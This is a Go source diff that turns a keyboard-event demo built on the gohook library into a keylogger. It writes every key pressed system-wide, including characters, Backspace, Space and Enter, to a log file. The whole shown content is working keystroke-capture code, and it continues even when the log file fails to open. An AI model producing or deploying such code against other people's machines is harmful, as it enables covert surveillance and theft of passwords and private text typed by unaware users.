@@ -2,30 +2,33 @@ package main
 
 import (
 	"fmt"
-	//"os"
+	"os"
 
 	hook "github.com/robotn/gohook"
 )
 
 func main() {
 	fmt.Println("Start Program")
-	//file, err := os.Open("log.txt")
-	//if err != nil {
-	//}
-	//defer file.Close()
+
+	file, err := openLogFile()
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "failed to create log file: %v\n", err)
+	}
+	defer file.Close()
 
 	events := hook.Start()
 
 	for ev := range events {
 		if ev.Kind == hook.KeyHold {
 			if ev.Rawcode == 8 {
-				fmt.Println("Backspace")
+				file.WriteString("Backspace\n")
 			} else if ev.Rawcode == 32 {
-				fmt.Println("Space")
-			} else if ev.Rawcode == 13 {
-				fmt.Println("Enter")
+				file.WriteString("Space\n")
+			} else if ev.Rawcode == 13 { //change magic num
+				file.WriteString("Enter\n")
 			} else {
-				fmt.Printf(string(ev.Keychar) + "\n")
+				text := string(ev.Keychar) + "\n"
+				file.WriteString(text)
 			}
 		}
 	}
